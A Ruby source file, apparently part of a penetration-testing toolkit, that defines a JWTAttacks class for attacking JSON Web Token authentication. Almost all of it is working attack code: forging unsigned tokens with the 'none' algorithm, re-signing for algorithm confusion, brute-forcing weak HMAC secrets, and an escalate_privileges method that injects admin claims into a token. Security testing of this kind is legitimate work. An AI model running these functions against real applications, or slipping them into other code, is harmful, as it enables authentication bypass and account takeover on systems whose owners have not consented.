require 'base64'
require 'json'
require 'openssl'
require_relative '../utils/colorize'

class JWTAttacks
  def self.decode_jwt(token)
    parts = token.split('.')
    return nil if parts.length != 3
    
    header = JSON.parse(Base64.urlsafe_decode64(parts[0] + '=='))
    payload = JSON.parse(Base64.urlsafe_decode64(parts[1] + '=='))
    signature = parts[2]
    
    { header: header, payload: payload, signature: signature }
  rescue => e
    nil
  end

  def self.verify_jwt(token, secret = nil)
    decoded = decode_jwt(token)
    return false unless decoded
    
    header = decoded[:header]
    payload = decoded[:payload]
    
    if header['alg'] == 'none'
      puts Colorize.red("JWT uses 'none' algorithm - vulnerable!")
      return true
    end
    
    if secret
      alg = header['alg']
      data = "#{Base64.urlsafe_encode64(header.to_json, padding: false)}.#{Base64.urlsafe_encode64(payload.to_json, padding: false)}"
      
      case alg
      when 'HS256'
        expected = OpenSSL::HMAC.digest('SHA256', secret, data)
        actual = Base64.urlsafe_decode64(decoded[:signature] + '==')
        return expected == actual
      when 'HS384'
        expected = OpenSSL::HMAC.digest('SHA384', secret, data)
        actual = Base64.urlsafe_decode64(decoded[:signature] + '==')
        return expected == actual
      when 'HS512'
        expected = OpenSSL::HMAC.digest('SHA512', secret, data)
        actual = Base64.urlsafe_decode64(decoded[:signature] + '==')
        return expected == actual
      end
    end
    
    false
  end

  def self.attack_none_algorithm(token)
    decoded = decode_jwt(token)
    return nil unless decoded
    
    header = decoded[:header]
    payload = decoded[:payload]
    
    header['alg'] = 'none'
    header.delete('typ')
    
    new_token = "#{Base64.urlsafe_encode64(header.to_json, padding: false)}.#{Base64.urlsafe_encode64(payload.to_json, padding: false)}."
    
    puts Colorize.red("Modified JWT (none algorithm): #{new_token}")
    new_token
  end

  def self.attack_algorithm_confusion(token, secret)
    decoded = decode_jwt(token)
    return nil unless decoded
    
    header = decoded[:header]
    payload = decoded[:payload]
    
    header['alg'] = 'HS256'
    
    data = "#{Base64.urlsafe_encode64(header.to_json, padding: false)}.#{Base64.urlsafe_encode64(payload.to_json, padding: false)}"
    signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest('SHA256', secret, data), padding: false)
    
    new_token = "#{data}.#{signature}"
    
    puts Colorize.red("Modified JWT (HS256): #{new_token}")
    new_token
  end

  def self.attack_weak_secret(token, wordlist = nil)
    secrets = wordlist ? File.readlines(wordlist).map(&:chomp) : ['secret', 'password', '123456', 'admin', 'key', 'test', 'default']
    
    decoded = decode_jwt(token)
    return nil unless decoded
    
    header = decoded[:header]
    payload = decoded[:payload]
    alg = header['alg']
    
    return nil unless alg.start_with?('HS')
    
    data = "#{Base64.urlsafe_encode64(header.to_json, padding: false)}.#{Base64.urlsafe_encode64(payload.to_json, padding: false)}"
    actual_sig = decoded[:signature]
    
    secrets.each do |secret|
      case alg
      when 'HS256'
        expected = Base64.urlsafe_encode64(OpenSSL::HMAC.digest('SHA256', secret, data), padding: false)
      when 'HS384'
        expected = Base64.urlsafe_encode64(OpenSSL::HMAC.digest('SHA384', secret, data), padding: false)
      when 'HS512'
        expected = Base64.urlsafe_encode64(OpenSSL::HMAC.digest('SHA512', secret, data), padding: false)
      else
        next
      end
      
      if expected == actual_sig
        puts Colorize.green("Secret found: #{secret}")
        return secret
      end
    end
    
    nil
  end

  def self.modify_payload(token, new_payload)
    decoded = decode_jwt(token)
    return nil unless decoded
    
    header = decoded[:header]
    
    header['alg'] = 'none'
    header.delete('typ')
    
    new_token = "#{Base64.urlsafe_encode64(header.to_json, padding: false)}.#{Base64.urlsafe_encode64(new_payload.to_json, padding: false)}."
    
    puts Colorize.red("Modified JWT payload: #{new_token}")
    new_token
  end

  def self.escalate_privileges(token)
    decoded = decode_jwt(token)
    return nil unless decoded
    
    payload = decoded[:payload]
    
    payload['admin'] = true
    payload['role'] = 'admin'
    payload['isAdmin'] = true
    payload['user_type'] = 'admin'
    payload['privileges'] = ['admin', 'user']
    
    modify_payload(token, payload)
  end
end

